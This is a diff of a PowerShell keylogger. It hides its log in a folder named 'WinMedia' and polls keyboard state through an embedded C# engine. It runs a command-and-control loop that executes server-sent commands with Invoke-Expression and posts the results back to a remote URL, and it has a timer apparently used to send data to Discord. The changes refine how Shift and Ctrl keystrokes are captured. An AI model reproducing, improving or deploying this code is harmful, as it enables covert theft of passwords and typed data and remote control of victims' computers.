@@ -7,7 +7,7 @@ $dir        = "$env:LOCALAPPDATA\WinMedia"
 if (!(Test-Path $dir)) { New-Item $dir -Type Directory | Out-Null }
 $logFile = "$dir\data.txt"
 
-# 2. Rebuilt Native C# Keyboard State Engine (Translates Case States Perfectly)
+# 2. Rebuilt Native C# Keyboard State Engine
 $Source = @'
 using System;
 using System.Text;
@@ -27,40 +27,43 @@ $discordInterval = 0
 $headers = @{ "User-Agent" = "Mozilla/5.0 (Windows NT 10.0; Win64; x64)" }
 
 while ($true) {
-    # ================= ENGINE A: HIGH-SPEED UNICODE KEYLOGGER =================
-    # Scan standard keyboard inputs (Skipping useless mouse buttons to maximize polling speed)
+    # ================= ENGINE A: HIGH-SPEED MODIFIER KEYLOGGER =================
+    # Query Shift and Control modifier states directly from the OS tracking tables
+    $isShiftActive = (([KeyEngine]::GetAsyncKeyState(16) -band 0x8000) -or ([KeyEngine]::GetAsyncKeyState(160) -band 0x8000) -or ([KeyEngine]::GetAsyncKeyState(161) -band 0x8000))
+    $isCtrlActive  = (([KeyEngine]::GetAsyncKeyState(17) -band 0x8000) -or ([KeyEngine]::GetAsyncKeyState(162) -band 0x8000))
+
     for ($i = 8; $i -le 190; $i++) {
         if ([KeyEngine]::GetAsyncKeyState($i) -eq -32767) {
             $keyText = ""
             
-            # Catch structural execution key combinations explicitly
-            $isCtrl = ([KeyEngine]::GetAsyncKeyState(17) -band 0x8000)
-            if ($isCtrl -and $i -ne 17) {
-                $rawChar = [char]$i
-                try { " [CTRL+$rawChar] " | Out-File $logFile -Append -NoNewline -ErrorAction SilentlyContinue } catch {}
-                continue
-            }
+            # Skip lone layout modifier taps to prevent log clutter
+            if ($i -eq 16 -or $i -eq 17 -or $i -eq 18 -or $i -eq 160 -or $i -eq 161 -or $i -eq 162 -or $i -eq 165) { continue }
 
             switch ($i) {
                 8   { $keyText = " [BACKSPACE] " }
                 9   { $keyText = " [TAB] " }
                 13  { $keyText = "`n" }
-                16  { $keyText = "" } # Handled natively by keyboard mapping state arrays
-                17  { $keyText = "" } # Handled above
                 18  { $keyText = " [ALT] " }
                 20  { $keyText = " [CAPS] " }
                 27  { $keyText = " [ESC] " }
                 32  { $keyText = " " }
                 46  { $keyText = " [DEL] " }
                 default {
-                    # Query active memory tables to determine if letters are lower or upper case natively
-                    $keyState = New-Object byte[] 256
-                    [KeyEngine]::GetKeyboardState($keyState) | Out-Null
-                    $scanCode = [KeyEngine]::MapVirtualKey($i, 0)
-                    $buffer = New-Object System.Text.StringBuilder 5
-
-                    $rc = [KeyEngine]::ToUnicode($i, $scanCode, $keyState, $buffer, $buffer.Capacity, 0)
-                    if ($rc -gt 0) { $keyText = $buffer.ToString() }
+                    $rawChar = [char]$i
+                    
+                    # Process combo variations relative to live modifier maps
+                    if ($isCtrlActive) { 
+                        $keyText = " [CTRL+$rawChar] " 
+                    } elseif ($isShiftActive) { 
+                        # Handle letter values or shift combinations cleanly
+                        if ($i -ge 65 -and $i -le 90) {
+                            $keyText = $rawChar.ToString().ToUpper() 
+                        } else {
+                            $keyText = " [SHIFT+$rawChar] "
+                        }
+                    } else { 
+                        $keyText = $rawChar.ToString().ToLower() 
+                    }
                 }
             }
 
@@ -78,7 +81,6 @@ while ($true) {
                 $output = (Invoke-Expression $cmdResponse 2>&1 | Out-String)
                 if (!$output) { $output = 'Command executed with no return data.' }
                 
-                # FIXED: Added explicit plain-text Content-Type header to ensure Flask accepts the body string
                 $postUrl = "${C2Url}/send_res?id=${PCName}"
                 Invoke-RestMethod -Uri $postUrl -Method Post -Body $output -ContentType "text/plain" -Headers $headers -TimeoutSec 5 | Out-Null
             }
@@ -101,7 +103,6 @@ while ($true) {
         $discordInterval = 0
     }
 
-    # Fast loop delay (5ms maximizes logging accuracy without spiking local CPU)
     Start-Sleep -m 5
     $c2Interval += 5
     $discordInterval += 5
